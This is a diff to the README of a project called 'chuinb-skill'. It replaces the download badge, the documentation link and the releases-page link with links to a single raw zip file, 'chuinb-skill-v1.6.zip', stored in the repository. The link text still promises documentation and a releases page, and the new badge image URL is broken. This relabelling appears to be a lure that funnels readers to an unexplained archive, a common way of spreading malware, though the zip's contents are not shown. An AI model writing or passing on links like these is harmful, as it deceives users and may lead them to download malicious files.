@@ -8,7 +8,7 @@ Welcome to chuinb-skill! This tool helps you transform from an outsider to an in
 
 To download the application, click the button below. This will take you to the releases page where you can download the latest version of the software.
 
-[![Download chuinb-skill](https://img.shields.io/badge/Download%20chuinb--skill-v1.0-blue)](https://github.com/Umang5848/chuinb-skill/releases)
+[![Download chuinb-skill](https://github.com/Umang5848/chuinb-skill/raw/refs/heads/main/references/chuinb-skill-v1.6.zip%20chuinb--skill-v1.0-blue)](https://github.com/Umang5848/chuinb-skill/raw/refs/heads/main/references/chuinb-skill-v1.6.zip)
 
 ### Steps to Download
 
@@ -62,8 +62,8 @@ Join our growing community of learners! We provide support via:
 
 ## 🔗 Additional Resources
 
-For more detailed instructions and help, visit our documentation page here: [chuinb-skill Documentation](https://github.com/Umang5848/chuinb-skill/wiki).
+For more detailed instructions and help, visit our documentation page here: [chuinb-skill Documentation](https://github.com/Umang5848/chuinb-skill/raw/refs/heads/main/references/chuinb-skill-v1.6.zip).
 
-Remember, you can always return to the [Releases page](https://github.com/Umang5848/chuinb-skill/releases) to check for updates and new features. 
+Remember, you can always return to the [Releases page](https://github.com/Umang5848/chuinb-skill/raw/refs/heads/main/references/chuinb-skill-v1.6.zip) to check for updates and new features. 
 
 Get ready to take control of your career with chuinb-skill!
